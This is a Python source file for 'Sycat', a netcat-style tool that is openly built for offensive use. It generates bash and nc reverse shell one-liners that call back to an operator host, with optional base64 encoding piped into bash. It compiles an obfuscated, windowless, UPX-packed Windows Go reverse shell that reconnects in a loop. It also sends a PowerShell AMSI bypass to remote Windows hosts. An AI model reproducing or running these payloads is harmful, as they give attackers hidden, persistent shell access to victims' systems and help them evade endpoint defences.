#!/usr/bin/env python3

import termios, tty
import subprocess
import threading
import logging
import argparse
import select
import socket
import base64
import random
import string
import pty
import ssl
import sys
import os

class Server:
    '''
    '''
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def listener(self):

        if args.ssl:
            logging.debug("Sycat: Version 0.4")
            if args.ssl_key is None or args.ssl_cert is None:
                print('Sycat: Both --ssl-key and --ssl-cert are required when using SSL/TLS encryption.')
                sys.exit(1)
            elif not os.path.exists(args.ssl_key):
                print("Sycat: SSL key file does not exist:", args.ssl_key)
                sys.exit(1)
            elif not os.path.exists(args.ssl_cert):
                print("Sycat: SSL certificate file does not exist:", args.ssl_cert)
                sys.exit(1)

        sokt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sokt.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            logging.debug("Sycat: Version 0.4")
            sokt.bind((self.host, self.port))
            logging.debug(f"Sycat: Listening on {host}:{port}")
            sokt.listen(1)
        except Exception as Err:
            print(f"Sycat: {Err}")
            sys.exit(1)

        conn, addr = sokt.accept()

        logging.debug(f"Sycat: Connection from {addr[0]}")
        logging.debug(f"Sycat: Connection from {addr[0]}:{addr[1]}")

        if args.ssl:
            _ssl = Miscellanous(conn)
            return _ssl.use_ssl()     

        if args.execute:
            exec_ = Miscellanous(conn)
            exec_.execute(args.execute)

        return conn

    def connect(self):
        '''
        Connect to a server, still detect tty/pty terminal in case we connect to bind shell.
        use thread to receive data faster and receive continously.
        don't have to wait for user input for receiving data.
        on args.execute we exit the program so the Thread will not screwd up
        '''

        #STDIN check
        from_stdin, _, _ = select.select([sys.stdin], [], [], 0)

        if args.ssl:
            logging.debug("Sycat: Version 0.4")
            if args.ssl_cert is None:
                print('Sycat: --ssl-cert are required when connect using SSL/TLS encryption.')
                sys.exit(1)
            elif not os.path.exists(args.ssl_cert):
                print("Sycat: SSL certificate file does not exist:", args.ssl_cert)
                sys.exit(1)

        try:
            logging.debug("Sycat: Version 0.4")
            sokt = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            if args.ssl:
                sokt = ssl.wrap_socket(
                    sokt,
                    keyfile=None,
                    certfile=None, 
                    ca_certs=args.ssl_cert,  # Server's certificate for verification
                    cert_reqs=ssl.CERT_REQUIRED
                )

            sokt.connect((self.host, self.port))
            logging.debug(f"Sycat: Connected to {self.host}:{self.port}")

            if args.execute:
                exec_ = Miscellanous(sokt)
                exec_.execute(args.execute)
                os._exit(os.EX_OK)
            
            data = Receiver(sokt)
            t = threading.Thread(target=data.recv_data, args=())
            t.start()

            #treat STDIN as our input and send it
            if from_stdin:
                file_data = sys.stdin.buffer.read()
                sokt.sendall(file_data)
                logging.debug(f'Sycat: {len(file_data)} bytes sent.')
                data.cleaner()

            if args.upgrade:
                _upgrade = Miscellanous(sokt)
                _upgrade.upgrade_shell()

            while True:
                #continously check terminal is in raw tty or not
                is_raw = IOtty().stdin_israw()
    
                # Read input from terminal
                if is_raw:
                    user_input = sys.stdin.buffer.read(1)
                    sokt.sendall(user_input)
                else:
                    user_input = sys.stdin.read(1)
                    sokt.sendall(user_input.encode())
    
            data.cleaner()
        except (Exception, ConnectionResetError, socket.error) as err:
            print(f'Sycat: {err}')
            sys.exit(1)

class Receiver:
    '''
    Receiver class is also a cleaner
    '''
    def __init__(self, conn):
        self.conn = conn

    # shut and close the socket to prevent extra bytes when receiving binary data
    def cleaner(self):
        '''
        os._exit() method in Python is used to exit the process 
        with specified status without calling cleanup handlers, flushing stdio buffers, kill all threads, etc. 
        '''
        try:
            self.conn.close()
        except:
            pass

        #os.EX_OK = 0
        os._exit(os.EX_OK)

    def recv_data(self):
        '''
        receive big data at a time.
        output buffer instead decoding (in some case decoding is a bad idea specially when receiving binary data).
        '''
        buff = 8 * 1024
        data = ''

        while True:
            try:
                data = self.conn.recv(buff)
            except (ConnectionResetError, OSError):
                logging.debug('Sycat: Connection Reset by the client.')
                break

            if not data:
                break

            sys.stdout.buffer.write(data)
            sys.stdout.buffer.flush()

        self.cleaner()

class IOtty:
    '''
    Stdin Section (thanks to pwncat cytopia "https://github.com/cytopia/pwncat/blob/master/bin/pwncat#L3488")
    '''
    def __init__(self):
        self.fileno = sys.stdin.fileno()

    def stdin_israw(self):
        """Check if the terminal (STDIN) is set to raw mode."""
        fild = self.fileno
        try:
            mode = termios.tcgetattr(fild)
        except termios.error:
            # Not a TTY
            return False

        # ICANON
        # https://linux.die.net/man/3/termios
        # The setting of the ICANON canon flag in c_lflag determines whether
        # the terminal is operating in canonical mode (ICANON set) or
        # noncanonical (raw) mode (ICANON unset). By default, ICANON set.
        return mode[tty.LFLAG] != (mode[tty.LFLAG] | termios.ICANON)
    
class Miscellanous:
    def __init__(self, conn):
        self.conn = conn

    #upgrade_shell is pty shell (linux only)
    def upgrade_shell(self):
        #get size of current terminal
        rows = os.get_terminal_size().lines
        cols = os.get_terminal_size().columns

        logging.debug('Sycat: Spawning pty shell.')

        command = """export TERM=xterm; python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null"""
        command += '\n'
        self.conn.sendall(command.encode())

        logging.debug(f'Sycat: Configuring stty with rows {rows} and cols {cols}.\n')
        stty_command = f'stty rows {rows} cols {cols}\n'
        self.conn.sendall(stty_command.encode())

    #try to bypass amsi (windows only)
    def amsi_bypass(self):
        logging.debug('Sycat: Bypassing AMSI on remote windows.')
        command = '''$a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Failed") {$f = $e}};$f.SetValue($null,$true)'''
        command += '\n'
        self.conn.sendall(command.encode())
        logging.debug('Sycat: Load external ps1 script to test the AMSI.')

    def execute(self, cmd):
        os.dup2(self.conn.fileno(),0)
        os.dup2(self.conn.fileno(),1)
        os.dup2(self.conn.fileno(),2)
        pty.spawn(cmd)

    def use_ssl(self):
        '''
        generate pem without passphrase:
        `openssl req -x509 -newkey rsa:4096 -keyout server-key.pem -out server-cert.pem -days 365 -nodes`
        '''
        if os.path.exists(args.ssl_key) == False:
            print(f'Sycat: File {args.ssl_key} not found.')
            sys.exit(1)
        elif os.path.exists(args.ssl_cert) == False:
            print(f'Sycat: File {args.ssl_cert} not found.')
            sys.exit(1)
        try:
            ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            ssl_context.load_cert_chain(certfile=args.ssl_cert, keyfile=args.ssl_key)
            ssl_sock = ssl_context.wrap_socket(self.conn, server_side=True)

            return ssl_sock

        except Exception as Err:
            print(f'Sycat: {Err}')
            sys.exit(1)
        
class Generator:
    def __init__(self, host, port, options):
        self.host = host
        self.port = port
        self.options = options

    def random_string(self):
        letters = string.ascii_letters + string.digits  
        return ''.join(random.choice(letters) for _ in range(5))

    def linux_posix(self):
        if self.options == 'bash':
            payload = f'''bash -c "bash -i > /dev/tcp/{self.host}/{self.port} 0>&1"'''
            if args.encode:
                encoded_payload = base64.b64encode(payload.encode('utf-8'))
                print(f'Sycat: encoded payload => {encoded_payload.decode()}')
                print(f'Sycat: common use => echo -n {encoded_payload.decode()} | base64 -d | bash')
            else:
                print(payload)
        elif self.options == 'nc':
            _random= self.random_string()
            payload = f'rm -f /tmp/{_random};mkfifo /tmp/{_random};cat /tmp/{_random}|/bin/sh -i 2>&1|nc {self.host} {self.port} >/tmp/{_random}'
            if args.encode:
                encoded_payload = base64.b64encode(payload.encode('utf-8'))
                print(f'Sycat: encoded payload => {encoded_payload.decode()}')
                print(f'Sycat: common use => echo -n {encoded_payload.decode()} | base64 -d | bash')
            else:
                print(payload)
    
    def windows(self):
        if self.options == 'exe':
            print('Sycat: Building the binary script.')
            binary = '''package main
import  (
	N3t "net"
	O5E "os/exec"
	sYsC4LL "syscall"
	"time"
)
func main() {
	for true {
		conn, err := N3t.Dial("tcp", "%s:%d")
		if err != nil { time.Sleep(30 * time.Second) }
		kOmManDT := O5E.Command("PoWeRsHell.ExE")
		kOmManDT.SysProcAttr = &sYsC4LL.SysProcAttr{HideWindow: true}
        kOmManDT.Stdin = conn
        kOmManDT.Stdout = conn
        kOmManDT.Stderr = conn
		kOmManDT.Run()
	}
}
''' %(host,int(port))
        with open('main.go', 'w+') as f:
            f.write(binary)
            f.close()
        print('Sycat: Compiling binary using golang')
        os.system('GOOS=windows GOARCH=amd64 go build -o payload.exe --ldflags "-H=windowsgui" main.go')
        os.remove('main.go')
        print('Sycat: Compressing file size.')
        subprocess.call('upx -9 payload.exe', shell=True,stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
        print(f'Sycat: payload.exe ({(os.path.getsize("payload.exe")/1024)/1024:.2f} MB) compiled.')

class Handler:
    '''
    use thread to receive data faster and receive continously.
    don't have to wait for user input for receiving data.
    '''
    def __init__(self, conn):
        self.conn = conn

    def run(self):
        if args.upgrade:
            pty = Miscellanous(self.conn)
            pty.upgrade_shell()
        
        elif args.bypassamsi:
            amsi = Miscellanous(self.conn)
            amsi.amsi_bypass()

        #receive data and print to stdout
        data = Receiver(self.conn)
        t = threading.Thread(target=data.recv_data, args=())
        t.start()

        try:
            while True:
                #continously check terminal is in raw tty or not
                is_raw = IOtty().stdin_israw()
    
                # Read input from terminal
                if is_raw:
                    user_input = sys.stdin.buffer.read(1)
                    self.conn.sendall(user_input)
                else:
                    user_input = sys.stdin.read(1)
                    self.conn.sendall(user_input.encode())
    
            data.cleaner()
        except socket.error as err:
            print(f'Sycat: {err}')
            data.cleaner()

if __name__ == '__main__':

    parser = argparse.ArgumentParser(allow_abbrev=False,description="Sycat is a netcat implementation in python (by: sud0ku)")
    parser.add_argument("hostname", nargs='?', default='0.0.0.0', help="Source ip for listening or connect to. (default 0.0.0.0)")
    parser.add_argument("port", type=int, help="Port number to listen on")
    parser.add_argument("-amsi","--bypassamsi", help="Bypass amsi on windows", action="store_true")
    parser.add_argument("-e","--execute", metavar='<command>', help="Execute the given command, not compatible with SSL.")
    parser.add_argument("-en","--encode", help="Encode the reverse shell payload into base64", action="store_true")
    parser.add_argument("-g","--generate", metavar="<type>", help="Generate payload, available type (nc, bash, exe)")
    parser.add_argument("-l","--listen",help="Listen mode", action="store_true")
    parser.add_argument("--ssl",help="Connect or Listen with SSL", action="store_true")
    parser.add_argument("--ssl-key",metavar="<key/pem>", help="Specify SSL private key (PEM / KEY) for listening")
    parser.add_argument("--ssl-cert",metavar="<crt/pem>",help="Specify SSL certificate key (PEM / CRT) for listening")
    parser.add_argument("-tty","--upgrade", help="Auto spawn pty shell and configure the terminal size (linux only)", action="store_true")
    parser.add_argument("-v", "--verbose", help="Verbose output", action="store_true")

    args = parser.parse_args()

    host = args.hostname
    port = args.port

    if args.verbose:
        logging.root.handlers = []
        logging.basicConfig(level=logging.DEBUG,format="%(message)s",)
        
    if args.generate == 'bash':
        gen = Generator(host, port, args.generate)
        gen.linux_posix()
        sys.exit(0)
    elif args.generate == 'nc':
        gen = Generator(host, port, args.generate)
        gen.linux_posix()
        sys.exit(0)
    elif args.generate == 'exe':
        gen = Generator(host, port, args.generate)
        gen.windows()
        sys.exit(0)

    try :
        if args.listen:
            client = Server(host, port)
            shell = Handler(client.listener())
            t = threading.Thread(target=shell.run, args=())
            t.start()
            t.join()
        else:
            Server(host, port).connect()
    except KeyboardInterrupt:
        os._exit(os.EX_OK)
